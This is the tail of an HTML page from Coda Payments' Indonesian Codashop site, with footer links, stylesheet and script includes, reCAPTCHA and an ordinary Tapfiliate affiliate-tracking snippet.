                              <path d="M320 352h-23.1a174.08 174.08 0 0 1-145.8 0H128A128 128 0 0 0 0 480a32 32 0 0 0 32 32h384a32 32 0 0 0 32-32 128 128 0 0 0-128-128zM48 224a16 16 0 0 0 16-16v-16c0-88.22 71.78-160 160-160s160 71.78 160 160v16a80.09 80.09 0 0 1-80 80h-32a32 32 0 0 0-32-32h-32a32 32 0 0 0 0 64h96a112.14 112.14 0 0 0 112-112v-16C416 86.13 329.87 0 224 0S32 86.13 32 192v16a16 16 0 0 0 16 16zm160 0h32a64 64 0 0 1 55.41 32H304a48.05 48.05 0 0 0 48-48v-16a128 128 0 0 0-256 0c0 40.42 19.1 76 48.35 99.47-.06-1.17-.35-2.28-.35-3.47a64.07 64.07 0 0 1 64-64z"/>
                           </svg>
                        </div>
                        <div class="contact-text">Contact us</div>
                     </a>
                  </div>
                  <div class="international-container">
                     <a href="/international" class="international-flag-block" rel="noopener">
                        <i class='footer__country-flag f32_indonesia' id="footer__country-flag"></i>
                        <div class="international__country-name">Indonesia</div>
                     </a>
                  </div>
               </section>
               <section class="right-blocks-container">
                  <div class="legal-content-container">
                     <a href="/marketing-and-partnerships" target="_blank" rel="noopener">Marketing and Partnership</a>
                     <a href='https://www.codapayments.com/terms-conditions' target="_blank" rel="noopener">Terms and conditions</a>
                     <a href='https://www.codapayments.com/privacy-policy-bahasa' target="_blank" rel="noopener">Privacy Policy</a>
                  </div>
                  <div class="copyright-container"> ©Coda Payments Copyright  </div>
               </section>
            </div>
         </footer>
      </div>
      <script>
         if ((location.href.includes("grab-demo.coda")) || (location.href.includes("grab.codashop"))) {
             $("body").addClass("custom--grab");
             $(".logo-container-link").contents().unwrap();
             $("body").append('<link rel="stylesheet" type="text/css" href="https://cdn1.codashop.com/S2/content/mobile/css/responsive-grab-page.6b9f5c3d59.css" />');
         }
      </script>
      <link rel="stylesheet" type="text/css" href="https://cdn1.codashop.com/S/content/common/css/flags.css" />
      <link rel="stylesheet" type="text/css" href="https://cdn1.codashop.com/P/airtime/w/css/airtime_v1.0a.css" />
      <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
      <a href="https://plus.google.com/104822527805498875313" style="display: none;" rel="publisher">Google+</a>
      <script type="text/javascript" src="https://cdn1.codashop.com/S2/content/common/js/infoBar.38acc407b3.js"></script>
      <script type="text/javascript" src="https://cdn1.codashop.com/S2/content/common/js/faq.7a04e34b3d.js"></script>
      <script type="text/javascript" src="https://cdn1.codashop.com/S2/content/common/js/payment-channel-suggestion.535f3c6f70.js"></script>
      <script type="text/javascript" src="https://www.google.com/recaptcha/api.js" async defer></script>
      <script type="text/javascript">
         (function(t, a, p) {
             t.TapfiliateObject = a;
             t[a] = t[a] || function() {
                 (t[a].q = t[a].q || []).push(arguments)
             }
         })(window, 'tap');
         
         tap('create', '11857-697628');
         tap('detect');
         
         tap('getTrackingId', null, function(trackingId) {
             CODA.Shop.affiliateTrackingId = trackingId ? trackingId : '';
         });
      </script>

   </body>
</html>